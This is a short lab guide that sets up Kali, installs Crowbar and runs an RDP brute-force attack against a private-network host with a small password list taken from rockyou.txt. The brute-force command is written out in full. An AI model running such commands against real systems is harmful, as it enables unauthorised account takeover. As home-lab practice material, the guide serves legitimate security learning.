# Simple Configuration Guide  

## 1. Set IP Address and DNS  
Configure the machine with the following settings:  
- **IP Address:** `192.168.10.250/24`  
- **DNS:** `8.8.8.8`  

## 2. Update and Upgrade Kali Machine  
Run the following command:  
```bash
apt-get update && apt-get upgrade
```

## 3. Create Project Directory  
Create a directory named **AD-Project** where all project files will be stored:  
```bash
mkdir AD-Project
```

## 4. Install Crowbar for Brute Force Attacks  
Use the following command to install **crowbar**:  
```bash
sudo apt-get install -y crowbar
```

## 5. Copy RockYou Wordlist  
Copy the `rockyou.txt` wordlist from `/usr/share/wordlists/` to the `AD-Project` directory.  
If `rockyou.txt` is compressed (`rockyou.txt.gz`), first unzip it:  
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```
Then copy it to the project directory:  
```bash
cp /usr/share/wordlists/rockyou.txt ~/Desktop/AD-Project/
```

## 6. Create a Password List  
Copy the first 20 passwords from `rockyou.txt` into a new file called `password.txt`:  
```bash
cd ~/Desktop/AD-Project
head -n 20 rockyou.txt > password.txt
```

## 7. Edit `password.txt`  
Modify `password.txt` to add the target password for brute force:  
```bash
nano password.txt
```

---

## Running the Brute Force Attack  
Use **Crowbar** to perform an RDP brute-force attack:  
```bash
crowbar -b rdp -u tinashe -C password.txt -s 192.168.10.100/32
```
- `-b rdp` → Specifies **Remote Desktop Protocol**  
- `-u tinashe` → Defines the **username**  
- `-C password.txt` → Specifies the **password file**  
- `-s 192.168.10.100/32` → Defines the **target IP address**  

---

### Notes  
- Ensure you have the correct permissions before running the attack.  
- This guide is for ethical hacking and penetration testing purposes only.  

---
